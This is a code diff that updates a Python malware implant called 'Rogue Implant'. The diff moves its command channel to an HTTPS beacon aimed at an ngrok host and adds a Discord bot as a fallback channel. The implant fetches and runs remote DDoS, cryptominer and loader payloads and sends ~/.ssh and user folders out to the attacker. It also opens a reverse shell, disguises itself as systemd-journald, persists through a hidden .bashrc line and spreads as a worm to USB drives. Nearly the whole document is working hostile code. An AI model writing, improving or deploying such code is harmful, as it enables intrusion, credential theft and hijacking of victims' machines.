@@ -2,21 +2,34 @@
 import socket, subprocess, base64, time, urllib.request, os, threading
 from Cryptodome.Cipher import AES
 import zipfile, tempfile, shutil, json
+import urllib.parse
+import ssl
+import hashlib
 
 # === Config ===
-SECRET_KEY = b'Sixteen byte key'
-EXFIL_KEY = b'magicRogueKey!'
-C2_HOST = 'YOUR.C2.IP.HERE'
-C2_PORT = 4444
+SECRET_KEY = b'666BabyROGUE!222'
+EXFIL_KEY = b'magicRogueKey!333'
+C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'  # No port in hostname
+C2_PORT = 443  # ngrok uses port 443
 EXFIL_PORT = 9090
-PAYLOAD_REPO = "https://abc123.ngrok.io/"
+PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
 
+# Implant unique identifier
+IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
+# Create consistent ID hash
+IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]
+
 # === Discord Fallback (Optional) ===
-DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
-BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
+DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
+DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
+BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"
+
+# Create a custom SSL context to handle ngrok certificates
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
 
 def encrypt_response(msg):
     cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
@@ -29,13 +42,69 @@ def decrypt_command(data):
     cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
     return cipher.decrypt_and_verify(ciphertext, tag).decode()
 
+def send_https_command(cmd):
+    """Send command over HTTPS to C2"""
+    url = f"https://{C2_HOST}/"
+    encrypted_cmd = encrypt_response(cmd)
+    
+    try:
+        req = urllib.request.Request(
+            url,
+            data=encrypted_cmd,
+            headers={
+                'Content-Type': 'application/octet-stream',
+                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                'X-Implant-ID': IMPLANT_ID_HASH
+            },
+            method='POST'
+        )
+        
+        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
+        encrypted_response = response.read()
+        decrypted_response = decrypt_command(encrypted_response)
+        return decrypted_response
+    except Exception as e:
+        error_msg = f"[!] Connection failed: {type(e).__name__}"
+        if hasattr(e, 'reason'):
+            error_msg += f" - {e.reason}"
+        print(f"[DEBUG] Connection error: {e}")
+        return error_msg
+
 def fetch_payload(name):
+    """Fetch payload from C2 server"""
     url = f"{PAYLOAD_REPO}{name}"
     dest = os.path.join(HIDDEN_DIR, name)
+    
     try:
-        urllib.request.urlretrieve(url, dest)
+        print(f"[*] Fetching payload: {name} from {url}")
+        
+        # Create request with proper headers and SSL context
+        req = urllib.request.Request(
+            url,
+            headers={
+                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                'X-Implant-ID': IMPLANT_ID_HASH
+            }
+        )
+        
+        # Download the file with SSL context
+        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
+        
+        # Write the file
+        with open(dest, 'wb') as f:
+            f.write(response.read())
+        
+        # Make it executable if it's a Python script
+        if name.endswith('.py'):
+            os.chmod(dest, 0o755)
+            print(f"[+] Python payload saved and made executable: {dest}")
+        else:
+            print(f"[+] Payload saved: {dest}")
+        
         return dest
-    except:
+        
+    except Exception as e:
+        print(f"[!] Failed to fetch payload {name}: {e}")
         return None
 
 def run_payload(name):
@@ -85,7 +154,8 @@ def exfiltrate_data(path):
         os.remove(zip_path)
 
         s = socket.socket()
-        s.connect((C2_HOST, EXFIL_PORT))
+        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
+        s.connect((host, EXFIL_PORT))
         s.sendall(encrypted_blob)
         s.close()
         return f"[+] Exfiltrated encrypted archive from: {path}"
@@ -95,7 +165,8 @@ def exfiltrate_data(path):
 def reverse_shell():
     try:
         s = socket.socket()
-        s.connect((C2_HOST, 9001))
+        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
+        s.connect((host, 9001))
         while True:
             s.send(b"$ ")
             cmd = s.recv(1024).decode()
@@ -109,19 +180,29 @@ def reverse_shell():
 
 def handle_trigger(cmd):
     if cmd.startswith("trigger_ddos"):
+        # Download ddos.py first
         fetch_payload("ddos.py")
         path = os.path.join(HIDDEN_DIR, "ddos.py")
         args = " ".join(cmd.split()[1:])
-        return subprocess.getoutput(f"python3 {path} {args}")
+        if os.path.exists(path):
+            return subprocess.getoutput(f"python3 {path} {args}")
+        return "[!] ddos.py not found after download"
 
     elif cmd == "trigger_mine":
+        # Download mine.py first
+        fetch_payload("mine.py")
         return run_payload("mine.py")
 
     elif cmd == "trigger_stopmine":
         return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")
 
     elif cmd.startswith("trigger_exfil"):
-        return exfiltrate_data(cmd.split(" ", 1)[1])
+        # Extract path from command
+        parts = cmd.split()
+        if len(parts) < 2:
+            return "[!] Usage: trigger_exfil <path>"
+        path = parts[1]
+        return exfiltrate_data(path)
 
     elif cmd == "trigger_dumpcreds":
         targets = [
@@ -130,77 +211,145 @@ def handle_trigger(cmd):
             os.path.expanduser("~/Pictures"),
             os.path.expanduser("~/Desktop"),
             os.path.expanduser("~/.ssh"),
-            os.path.expanduser("~/.wallets"),
         ]
-        return exfiltrate_data(targets)
+        # Filter out non-existent directories
+        existing_targets = [t for t in targets if os.path.exists(t)]
+        if existing_targets:
+            return exfiltrate_data(existing_targets)
+        return "[!] No target directories found"
 
     elif cmd == "trigger_stealthinject":
         path = os.path.join(HIDDEN_DIR, "polyloader.py")
         if not os.path.exists(path):
             fetch_payload("polyloader.py")
-        return subprocess.getoutput(f"python3 {path}")
+        if os.path.exists(path):
+            return subprocess.getoutput(f"python3 {path}")
+        return "[!] polyloader.py not found"
 
     return None
 
 def handle_command(cmd):
     if cmd.startswith("load_payload"):
-        return f"[+] Fetched {cmd.split()[1]}" if fetch_payload(cmd.split()[1]) else f"[!] Failed to fetch {cmd.split()[1]}"
+        parts = cmd.split()
+        if len(parts) < 2:
+            return "[!] Usage: load_payload <filename>"
+        payload_name = parts[1]
+        result = fetch_payload(payload_name)
+        return f"[+] Fetched {payload_name}" if result else f"[!] Failed to fetch {payload_name}"
+    
     elif cmd.startswith("run_payload"):
-        return run_payload(cmd.split()[1])
+        parts = cmd.split()
+        if len(parts) < 2:
+            return "[!] Usage: run_payload <filename>"
+        return run_payload(parts[1])
+    
     elif cmd.startswith("trigger_"):
-        return handle_trigger(cmd) or "[!] Trigger failed"
+        result = handle_trigger(cmd)
+        return result if result else "[!] Trigger failed"
+    
     elif cmd == "reverse_shell":
         threading.Thread(target=reverse_shell).start()
         return "[*] Reverse shell started"
-    return subprocess.getoutput(cmd)
+    
+    else:
+        # Default command execution
+        return subprocess.getoutput(cmd)
 
-def connect():
+def beacon():
+    """Main beacon loop using HTTPS"""
+    print(f"[+] Starting HTTPS beacon to {C2_HOST}")
+    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
+    
+    beacon_count = 0
+    identified = False
+    bot_id = None
+    
     while True:
         try:
-            s = socket.socket()
-            s.connect((C2_HOST, C2_PORT))
-            while True:
-                encrypted_data = s.recv(4096)
-                cmd = decrypt_command(encrypted_data)
-                result = handle_command(cmd)
-                s.send(encrypt_response(result))
-        except:
-            time.sleep(5)
+            beacon_count += 1
+            print(f"\n[BEACON #{beacon_count}] Checking in...")
+            
+            # Send beacon and check for commands
+            response = send_https_command("beacon")
+            print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
+            
+            # Check if response is a command to execute
+            if response and response != "pong":
+                if response.startswith("identified:"):
+                    bot_id = response.replace("identified:", "", 1)
+                    print(f"[+] C2 identified us as: {bot_id}")
+                    identified = True
+                else:
+                    print(f"[+] Received command: {response}")
+                    result = handle_command(response)
+                    result_preview = result[:100] + "..." if len(result) > 100 else result
+                    print(f"[+] Command result: {result_preview}")
+                    
+                    # Send result back
+                    if result:
+                        print(f"[+] Sending result to C2...")
+                        result_response = send_https_command(f"result:{result}")
+                        print(f"[+] C2 acknowledged: {result_response}")
+            
+            # If first beacon, send identification
+            if not identified and beacon_count == 1:
+                print(f"[+] Sending identification to C2...")
+                id_response = send_https_command(f"identify:{IMPLANT_ID_HASH}")
+                print(f"[+] C2 response: {id_response}")
+            
+            print(f"[.] Next beacon in 30 seconds...")
+            time.sleep(30)  # Beacon interval
+            
+        except Exception as e:
+            print(f"[!] Beacon error: {e}")
+            print(f"[!] Retrying in 60 seconds...")
+            time.sleep(60)
 
 def check_discord_command():
+    """Check Discord for commands"""
     try:
         headers = {"Authorization": f"Bot {BOT_TOKEN}"}
         req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
         response = urllib.request.urlopen(req).read().decode()
         latest = json.loads(response)[0]["content"]
         return latest
-    except:
+    except Exception as e:
         return None
 
 def send_to_webhook(content):
+    """Send result to Discord webhook"""
     try:
         req = urllib.request.Request(
             DISCORD_WEBHOOK,
             data=json.dumps({"content": content}).encode(),
             headers={"Content-Type": "application/json"},
-            method="POST"
+            method='POST'
         )
         urllib.request.urlopen(req)
     except:
         pass
 
 def discord_loop():
+    """Discord fallback command loop"""
     print("[+] Discord beacon active")
     last_cmd = ""
+    
     while True:
-        cmd = check_discord_command()
-        if cmd and cmd != last_cmd:
-            result = handle_command(cmd)
-            send_to_webhook(encrypt_response(result).decode())
-            last_cmd = cmd
+        try:
+            cmd = check_discord_command()
+            if cmd and cmd != last_cmd:
+                print(f"[Discord] Received command: {cmd}")
+                result = handle_command(cmd)
+                encrypted_result = encrypt_response(result).decode()
+                send_to_webhook(encrypted_result)
+                last_cmd = cmd
+        except Exception as e:
+            pass
+        
         time.sleep(30)
 
 def fake_name():
+    """Change process name for stealth"""
     try:
         import setproctitle
         setproctitle.setproctitle("systemd-journald")
@@ -208,29 +357,38 @@ def fake_name():
         pass
 
 def setup_persistence():
+    """Set up persistence via .bashrc"""
     target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
     if not os.path.exists(target):
         shutil.copy(__file__, target)
         with open(os.path.expanduser("~/.bashrc"), "a") as f:
-            f.write(f"\n(sleep 10 && python3 {target} &) &\n")
+            f.write(f"\n# System maintenance\n(sleep 10 && python3 {target} 2>/dev/null &) &\n")
         os.chmod(target, 0o700)
+        print(f"[+] Persistence installed: {target}")
 
 def worm_propagate():
-    drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
-    for mount in drives:
-        if "/media" in mount or "/run/media" in mount:
-            try:
-                worm_dir = os.path.join(mount.strip(), ".rogue_worm")
-                os.makedirs(worm_dir, exist_ok=True)
-                shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
-                with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
-                    f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
-            except:
-                pass
+    """Worm propagation to removable drives"""
+    try:
+        # For Linux
+        drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
+        for mount in drives:
+            if "/media" in mount or "/run/media" in mount:
+                try:
+                    worm_dir = os.path.join(mount.strip(), ".rogue_worm")
+                    os.makedirs(worm_dir, exist_ok=True)
+                    shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
+                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
+                        f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
+                    print(f"[+] Worm propagated to: {worm_dir}")
+                except:
+                    pass
+    except:
+        pass
 
 def p2p_listener():
+    """P2P listener for bot communication"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    backup_ports = [7007, 7008, 7009, 7010]
+    backup_ports = [7008, 7009, 7010, 7011]
     bound = False
 
     for port in backup_ports:
@@ -243,7 +401,6 @@ def p2p_listener():
             continue
 
     if not bound:
-        print("[!] Failed to bind to any P2P port. Exiting P2P listener.")
         return
 
     while True:
@@ -255,22 +412,37 @@ def p2p_listener():
             break
 
 def p2p_broadcast():
-    ports = [7007, 7008, 7009, 7010]
+    """P2P broadcast to find other bots"""
+    ports = [7008, 7009, 7010, 7011]
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
-    for port in ports:
-        try:
-            sock.sendto(b"Rogue?", ('<broadcast>', port))
-        except:
-            continue
+    while True:
+        for port in ports:
+            try:
+                sock.sendto(b"Rogue?", ('<broadcast>', port))
+            except:
+                continue
+        time.sleep(60)
 
 # === Launch ===
-threading.Thread(target=p2p_listener, daemon=True).start()
-threading.Thread(target=p2p_broadcast, daemon=True).start()
-threading.Thread(target=discord_loop, daemon=True).start()
-
-fake_name()
-setup_persistence()
-worm_propagate()
-connect()
+if __name__ == "__main__":
+    print("[+] Rogue Implant starting...")
+    print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
+    print(f"[+] Payload Repo: {PAYLOAD_REPO}")
+    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
+    
+    # Stealth and persistence
+    fake_name()
+    setup_persistence()
+    worm_propagate()
+    
+    # Start threads
+    threading.Thread(target=p2p_listener, daemon=True).start()
+    threading.Thread(target=p2p_broadcast, daemon=True).start()
+    threading.Thread(target=discord_loop, daemon=True).start()
+    
+    print("[+] All systems operational. Starting beacon...")
+    
+    # Start main HTTPS beacon (this will run in main thread)
+    beacon()
